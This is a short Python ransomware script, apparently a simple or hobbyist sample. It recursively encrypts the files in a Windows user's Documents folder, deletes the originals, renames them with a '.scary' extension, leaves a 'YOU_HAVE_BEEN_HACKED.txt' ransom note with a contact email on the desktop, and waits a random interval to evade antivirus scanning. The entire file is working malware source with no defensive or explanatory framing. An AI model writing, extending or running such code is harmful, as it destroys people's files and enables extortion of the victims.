import os
import random
import string
import time
import win32crypt
import sys

# Global configurations
ENCRYPTED_EXTENSION = ".scary"
DOCUMENTS_FOLDER = os.path.join(os.path.expanduser("~"), "Documents")  # Automatically get user's Documents folder

# Generate a random encryption code to be placed in the ransom note
def generate_encryption_code(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Use Windows API (bcrypt) to encrypt files
def encrypt_file_bcrypt(filepath):
    with open(filepath, 'rb') as f:
        file_data = f.read()
    
    # Using Windows API CryptProtectData for encryption
    encrypted_data = win32crypt.CryptProtectData(file_data, None, None, None, None, 0)

    # Write encrypted data back to a new file with the .scary extension
    encrypted_path = filepath + ENCRYPTED_EXTENSION
    with open(encrypted_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    # Remove the original file after encryption
    os.remove(filepath)

# Use Windows API (bcrypt) to decrypt files
def decrypt_file_bcrypt(filepath):
    with open(filepath, 'rb') as f:
        encrypted_data = f.read()
    
    # Decrypt using Windows CryptUnprotectData
    decrypted_data = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
    
    # Write the decrypted data back to the original file without the ".scary" extension
    decrypted_path = filepath.replace(ENCRYPTED_EXTENSION, "")
    with open(decrypted_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)
    
    os.remove(filepath)  # Remove the encrypted file

# Write ransom note to the desktop
def create_ransom_note(encryption_code):
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    note_path = os.path.join(desktop_path, "YOU_HAVE_BEEN_HACKED.txt")
    
    ransom_note = f"""
    All of your files have been encrypted.
    To unlock them, contact me with your encryption code at email@email.com.
    Your encryption code is: {encryption_code}
    """
    
    with open(note_path, 'w') as note:
        note.write(ransom_note)

# Encrypt all files in a directory recursively
def encrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file_bcrypt(file_path)

# Decrypt all files in a directory recursively
def decrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(ENCRYPTED_EXTENSION):  # Only target encrypted files
                file_path = os.path.join(root, file)
                decrypt_file_bcrypt(file_path)

if __name__ == "__main__":
    # Anti-detection: Delayed execution to avoid early scanning by antivirus
    time.sleep(random.randint(10, 30))

    # Check if the user wants to encrypt or decrypt
    if len(sys.argv) != 2:
        print("Usage: python ransomware.py [encrypt|decrypt]")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "encrypt":
        encryption_code = generate_encryption_code()  # Generate the encryption code

        # Automatically get the user's Documents folder for encryption
        encrypt_directory(DOCUMENTS_FOLDER)

        # Create ransom note on the desktop
        create_ransom_note(encryption_code)

        print(f"Files encrypted. Encryption code: {encryption_code}")

    elif mode == "decrypt":
        # Automatically get the user's Documents folder for decryption
        decrypt_directory(DOCUMENTS_FOLDER)

        print("Files decrypted successfully.")

    else:
        print("Invalid option. Use 'encrypt' or 'decrypt'.")
        sys.exit(1)
